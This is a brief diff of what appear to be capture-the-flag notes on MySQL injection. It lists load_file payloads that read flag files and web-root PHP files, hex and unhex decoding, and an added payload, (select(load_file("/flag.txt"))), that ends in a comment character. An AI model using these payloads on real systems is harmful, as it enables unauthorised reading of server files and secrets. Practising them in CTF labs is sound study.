@@ -89,7 +89,10 @@ select hex(load_file('E:/flag.txt')); //十六制读出666C61677B7361636A6E73313
 select unhex('666C61677B7361636A6E733132337D');
 
 load_file('/var/www/html/flag.php');
+(select(load_file("/flag.txt")))#
 group_concat(load_file('/var/www/html/flag.php'));
+
+
 
 
 
